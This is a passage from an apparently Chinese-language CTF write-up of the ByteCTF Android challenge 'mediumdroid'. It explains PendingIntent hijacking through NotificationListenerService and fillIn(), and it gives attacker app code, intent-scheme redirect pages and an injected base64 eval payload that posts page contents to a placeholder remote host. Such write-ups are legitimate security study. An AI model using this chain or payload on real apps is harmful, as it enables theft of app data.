class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.mediumdroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.app.NotificationChannel;</span><br><span class="line"><span class="keyword">import</span> android.app.NotificationManager;</span><br><span class="line"><span class="keyword">import</span> android.app.PendingIntent;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.webkit.JavascriptInterface;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"><span class="keyword">import</span> androidx.core.app.NotificationCompat;</span><br><span class="line"><span class="keyword">import</span> androidx.core.app.NotificationManagerCompat;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> getIntent().getStringExtra(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(getApplicationContext());</span><br><span class="line">        setContentView(webView);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.addJavascriptInterface(<span class="built_in">this</span>, <span class="string">&quot;jsi&quot;</span>);</span><br><span class="line">        webView.loadUrl(url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Te3t</span><span class="params">(String title, String content)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="number">26</span>) &#123;</span><br><span class="line">            <span class="type">NotificationChannel</span> <span class="variable">channel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationChannel</span>(<span class="string">&quot;CHANNEL_ID&quot;</span>, <span class="string">&quot;CHANNEL_NAME&quot;</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="type">NotificationManager</span> <span class="variable">notificationManager</span> <span class="operator">=</span> (NotificationManager) getSystemService(NotificationManager.class);</span><br><span class="line">            notificationManager.createNotificationChannel(channel);</span><br><span class="line">        &#125;</span><br><span class="line">        NotificationCompat.<span class="type">Builder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationCompat</span>.Builder(<span class="built_in">this</span>, <span class="string">&quot;CHANNEL_ID&quot;</span>).setContentTitle(title).setContentText(content).setSmallIcon(R.mipmap.ic_launcher).setContentIntent(PendingIntent.getBroadcast(<span class="built_in">this</span>, <span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">Intent</span>(), <span class="number">0</span>)).setAutoCancel(<span class="literal">true</span>).setPriority(<span class="number">1</span>);</span><br><span class="line">        <span class="type">NotificationManagerCompat</span> <span class="variable">nm</span> <span class="operator">=</span> NotificationManagerCompat.from(<span class="built_in">this</span>);</span><br><span class="line">        nm.notify(<span class="number">100</span>, builder.build());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PendingIntent"><a href="#PendingIntent" class="headerlink" title="PendingIntent"></a>PendingIntent</h3><p>Android 有三种 PendingIntent：</p><table><thead><tr><th>方法</th><th>用途</th></tr></thead><tbody><tr><td><code>getActivity()</code></td><td>启动 Activity</td></tr><tr><td><code>getService()</code></td><td>启动 Service</td></tr><tr><td><code>getBroadcast()</code></td><td><strong>发送广播</strong></td></tr></tbody></table><p>所以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PendingIntent.getBroadcast(...)</span><br></pre></td></tr></table></figure><p><strong>就是创建一个以后会被 sendBroadcast(intent)的凭证</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PendingIntent.getBroadcast(</span><br><span class="line">    <span class="built_in">this</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Intent</span>(),</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p> this：Context，表示：<strong>以 TestActivity当前 App 的身份</strong></p><p>requestCode &#x3D; 0：用于区分不同 PendingIntent，这里只有一个</p><p>new Intent() ：这是一个：空 Intent</p><p>flags &#x3D; 0：啥也没有</p><blockquote><p>A组件创建了一个 <code>PendingIntent</code>的对象然后传给 B组件，B 在执行这个 <strong>PendingIntent 的 send 时候，它里面的 Intent 会被发送出去</strong>，而接受到这个 Intent 的 C 组件会认为是 A 发的。<strong>B以A的权限和身份发送了这个Intent</strong>。</p><p>PendingIntent 是可变的，这意味着应用 B 可以按照 <a href="https://developer.android.google.cn/reference/android/content/Intent#fillIn(android.content.Intent,%20int)">fillIn()</a> 文档中所述的逻辑更新用于指定操作的内部 intent。换言之，恶意应用可能会修改未填充的 PendingIntent 字段，从而允许攻击者访问存在漏洞的应用中原本不支持导出的组件。</p><p>PendingIntent 之所以危险，是因为：创建它的 App 没把 Intent 填满，另一个 App 可以用 <code>fillIn()</code> 把空的地方补成恶意内容，然后系统会以原 App 身份执行这个 Intent。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fillIn()</span><br></pre></td></tr></table></figure><p>官方定义很绕，我们翻译成一句话：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A.fillIn(B, flags)</span><br></pre></td></tr></table></figure><p>意思是：<strong>用 Intent B 的内容，去“补全” Intent A 中“还没设置的字段”</strong></p><p>核心规则只有一条：<strong>A 里已经设置过的字段，默认不能被覆盖A 里没设置的字段，可以被 B 填进去</strong></p></blockquote><p>如果其他APP能够修改PendingIntent 封装的Intent 则可能会导致危险的事情发生，例如上文提到的广播，通过修改Intent然后发送广播可能会使被攻击APP未导出的广播接收器收到广播，受到攻击</p><p>如果应用以 Android 6（API 级别 23）或更高版本为目标平台，请指定可变性。例如，可以通过使用 FLAG_IMMUTABLE 来防止恶意应用填充未填充的字段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PendingIntent</span> <span class="variable">pendingIntent</span> <span class="operator">=</span></span><br><span class="line">        PendingIntent.getActivity(</span><br><span class="line">            getContext(),</span><br><span class="line">            <span class="comment">/* requestCode= */</span> <span class="number">0</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Intent</span>(intentAction),</span><br><span class="line">            PendingIntent.FLAG_IMMUTABLE);</span><br></pre></td></tr></table></figure><p><strong>在 Android 11（API 级别 30）及更高版本中，必须指定要将哪些字段设置为可变字段，以缓解此类意外漏洞。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取 Broadcast 关联的 PendingIntent</span></span><br><span class="line">PendingIntent.getBroadcast(Context context, <span class="type">int</span> requestCode, Intent intent, <span class="type">int</span> flags)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 Activity 关联的 PendingIntent</span></span><br><span class="line">PendingIntent.getActivity(Context context, <span class="type">int</span> requestCode, Intent intent, <span class="type">int</span> flags)</span><br><span class="line">PendingIntent.getActivity(Context context, <span class="type">int</span> requestCode, Intent intent, <span class="type">int</span> flags, Bundle options)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 Service 关联的 PendingIntent</span></span><br><span class="line">PendingIntent.getService(Context context, <span class="type">int</span> requestCode, Intent intent, <span class="type">int</span> flags)</span><br></pre></td></tr></table></figure><table><thead><tr><th>方法</th><th>将来系统替你做的事</th></tr></thead><tbody><tr><td><code>getActivity()</code></td><td><code>startActivity(intent)</code></td></tr><tr><td><code>getBroadcast()</code></td><td><code>sendBroadcast(intent)</code></td></tr><tr><td><code>getService()</code></td><td><code>startService(intent)</code></td></tr></tbody></table><blockquote><p>getBroadcast()是“提前把 sendBroadcast() 打包成一个凭证，真正发广播的是 sendBroadcast()，只是这个 sendBroadcast()是以后由系统代你执行的。</p><p>getActivity()的意思其实是，获取一个PendingIntent对象，而且该对象日后激发时所做的事情是启动一个新activity。也就是说，当它异步激发时，会执行类似Context.startActivity()那样的动作。相应地，getBroadcast()和getService()所获取的PendingIntent对象在激发时，会分别执行类似Context.sendBroadcast()和Context.startService()这样的动作。</p><p>PendingIntent 是系统对于待处理数据的一个引用，称之为：token；当主程序被 Killed 时，token 还是会继续存在的，可以继续供其他进程使用。如果要取消 PendingIntent，需要调用PendingIntent 的 cancel 方法。</p><p>Bundle options 是启动 Activity 时的额外启动参数，</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果新请求的 PendingIntent 发现已经存在时，取消已存在的，用新的 PendingIntent 替换</span></span><br><span class="line"><span class="type">int</span> FLAG_CANCEL_CURRENT</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果新请求的 PendingIntent 发现已经存在时，忽略新请求的，继续使用已存在的。日常开发中很少使用</span></span><br><span class="line"><span class="type">int</span> FLAG_NO_CREATE</span><br><span class="line"></span><br><span class="line"><span class="comment">//表示 PendingIntent 只能使用一次，如果已使用过，那么 getXXX(...) 将会返回 NULL </span></span><br><span class="line"><span class="comment">//也就是说同类的通知只能使用一次，后续的通知单击后无法打开。</span></span><br><span class="line"><span class="type">int</span> FLAG_ONE_SHOT</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果新请求的 PendingIntent 发现已经存在时, 如果 Intent 有字段改变了，这更新已存在的 PendingIntent</span></span><br><span class="line"><span class="type">int</span> FLAG_UPDATE_CURRENT</span><br></pre></td></tr></table></figure><table><thead><tr><th>Flag</th><th></th></tr></thead><tbody><tr><td><code>FLAG_CANCEL_CURRENT</code></td><td><strong>有旧的就删掉，重新创建</strong></td></tr><tr><td><code>FLAG_NO_CREATE</code></td><td><strong>只查不建，没有就返回 null</strong></td></tr><tr><td><code>FLAG_ONE_SHOT</code></td><td><strong>只能用一次，用完就失效</strong></td></tr><tr><td><code>FLAG_UPDATE_CURRENT</code></td><td><strong>有旧的就复用，并更新 Intent 内容</strong></td></tr></tbody></table><p>FLAG_CANCEL_CURRENT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PendingIntent.getBroadcast(ctx, 0, intentA, FLAG_CANCEL_CURRENT);</span><br><span class="line">PendingIntent.getBroadcast(ctx, 0, intentB, FLAG_CANCEL_CURRENT);</span><br></pre></td></tr></table></figure><p>结果：intentA 对应的 PendingIntent 被取消，intentB 成为新的</p><p>FLAG_NO_CREATE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PendingIntent pi = PendingIntent.getBroadcast(ctx, 0, intent, FLAG_NO_CREATE);</span><br></pre></td></tr></table></figure><p>如果存在 → 返回已有 PendingIntent</p><p>如果不存在 → 返回 null</p><p>FLAG_ONE_SHOT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PendingIntent pi = PendingIntent.getBroadcast(ctx, 0, intent, FLAG_ONE_SHOT);</span><br></pre></td></tr></table></figure><p>第一次 send() </p><p>第二次 send() （失效）</p><p>FLAG_UPDATE_CURRENT</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">i1.putExtra(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">PendingIntent.getBroadcast(ctx, <span class="number">0</span>, i1, FLAG_UPDATE_CURRENT);</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">i2.putExtra(<span class="string">&quot;a&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">PendingIntent.getBroadcast(ctx, <span class="number">0</span>, i2, FLAG_UPDATE_CURRENT);</span><br></pre></td></tr></table></figure><p>最终：extras &#x3D; { a &#x3D; 2 }</p><h2 id="攻击方案"><a href="#攻击方案" class="headerlink" title="攻击方案"></a>攻击方案</h2><p>跟easydroid一样先要利用MainActivity跳转到TestActivity</p><p>然后TestActivity中的webview加载由Intent Scheme Url传入的url，导致下一个恶意html被渲染，该HTML通过js接口调用Te3t触发通知创建PendingIntent</p><p>如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    jsi.<span class="title class_">Te3</span>t(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;test&quot;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>在攻击者APP中创建MagicService服务，用于监听通知，在获取到被攻击APP发出的通知后就可以获取到被攻击APP创建的PendingIntent</p><p>拿到PendingIntent后即可重新填充Intent，使其的Action设置为com.bytectf.SET_FLAG，并且添加flag参数将值设置为恶意html内容，然后使用send发送广播，当被攻击APP接收到广播后会设置flag，从而将恶意html内容插入到flag中，污染flag文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>);</span><br><span class="line">intent.setPackage(<span class="string">&quot;com.bytectf.mediumdroid&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">html</span> <span class="operator">=</span> <span class="string">&quot;&lt;img src=\&quot;x\&quot; onerror=\&quot;eval(atob(&#x27;eGhyPW5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignUE9TVCcsICdodHRwOi8veHgueHh4Lnh4eC54eHg6eHh4JywgdHJ1ZSk7IHhoci5zZXRSZXF1ZXN0SGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJyk7IHhoci5zZW5kKCdodG1sPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50Lm91dGVySFRNTCkpOw==&#x27;))\&quot;&gt;&quot;</span>;</span><br><span class="line">intent.putExtra(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&lt;html&gt;&quot;</span> + html + <span class="string">&quot;&lt;/html&quot;</span>);</span><br></pre></td></tr></table></figure><p>当恶意代码被注入到flag中后在攻击者APP的数据目录创建软链接 symlink.html，指向被污染的flag，而第一步中的恶意html会再设置一个Intent跳转延迟执行，这个Intent与前者不同点就是S.url&#x3D;file:&#x2F;&#x2F;&#x2F;data&#x2F;data&#x2F;com.bytectf.pwnmediumdroid&#x2F;files&#x2F;symlink.html ，从而导致在TestActivity中再次通过WebView加载url时渲染symlink.html ，这导致被污染的flag文件被渲染，从而触发注入到flag中的恶意代码，将内容传送到远程</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> location.<span class="property">href</span>=<span class="string">&quot;intent:dsad#Intent;package=com.bytectf.mediumdroid;component=com.bytectf.mediumdroid/.TestActivity;S.url=http%3A%2F%2Fxxx.xxx.xxx.xxx%2Fevil4.html;end&quot;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">jump2</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        location.<span class="property">href</span>=<span class="string">&quot;intent:dsad#Intent;package=com.bytectf.mediumdroid;component=com.bytectf.mediumdroid/.TestActivity;S.url=file:///data/data/com.bytectf.pwnmediumdroid/files/symlink.html;end&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(jump2, <span class="number">12000</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="构建攻击APP"><a href="#构建攻击APP" class="headerlink" title="构建攻击APP"></a>构建攻击APP</h2><p>MainActivity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Intent</span> <span class="variable">tmpIntent</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        startService(<span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, MagicService.class));</span><br><span class="line"></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.mediumdroid&quot;</span>,<span class="string">&quot;com.bytectf.mediumdroid.MainActivity&quot;</span>);</span><br><span class="line">        intent.setData(Uri.parse(<span class="string">&quot;http://toutiao.com@xxx.xxx.xxx.xxx/evil3.html&quot;</span>));</span><br><span class="line">        Log.d(<span class="string">&quot;TEST&quot;</span>,intent.toUri(Intent.URI_INTENT_SCHEME));</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MagicService &#x3D; NotificationListenerService</p><p>用来监听系统通知,拿到通知里的PendingIntent</p><p>evil.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>evil3<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  location.<span class="property">href</span> =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;intent://test#Intent;&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;component=com.bytectf.mediumdroid/.TestActivity;&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;S.url=http%3A%2F%2Fxxx%2Fevil2.html;&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;end&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    location.<span class="property">href</span> =</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;intent://test#Intent;&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;component=com.bytectf.mediumdroid/.TestActivity;&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;S.url=file:///data/data/com.bytectf.pwnmediumdroid/files/symlink.html;&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;end&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  &#125;, <span class="number">3000</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>先跳到 TestActivity，让它加载第二阶段页面</p><blockquote><p>注意：LLeaves博客里提到 S.url 里的 <code>&quot;http://&quot;&quot;</code> 的 <code>&quot;://&quot;&quot;</code> 最好编码，否则可能被转 https，把 <code>&quot;http://1.2.3.4/evil2.html&quot;</code> 编成 <code>&quot;http%3A%2F%2F1.2.3.4%2Fevil2.html&quot;</code></p></blockquote><p>延迟再跳一次 TestActivity，让它加载 file:&#x2F;&#x2F; 的 symlink.html（指向被污染 flag）</p><p>AndroidManifest.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.BIND_NOTIFICATION_LISTENER_SERVICE&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">tools:ignore</span>=<span class="string">&quot;ProtectedPermissions&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@xml/data_extraction_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/backup_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Mediumdroid&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">service</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.MagicService&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>BIND_NOTIFICATION_LISTENER_SERVICE</p><p>这是一个 <strong>系统级高权限</strong>：</p><blockquote><p>允许 App 绑定并运行 <code>NotificationListenerService</code></p></blockquote><p>监听系统中 <strong>所有通知</strong></p><p>拿到：</p><ul><li>Notification 对象</li><li>Notification 里的 <strong>PendingIntent</strong></li><li>包名 &#x2F; 内容 &#x2F; Action</li></ul><p>tools:ignore&#x3D;”ProtectedPermissions”</p><ul><li>这是 <strong>受保护权限</strong></li><li>普通 App 在 Manifest 里声明会被 lint 报警告</li><li><strong>只影响编译期检查</strong>，不影响系统行为</li></ul><p>没有 NotificationListenerService，无法send和修改PendingIntent</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.setContentIntent(</span><br><span class="line">    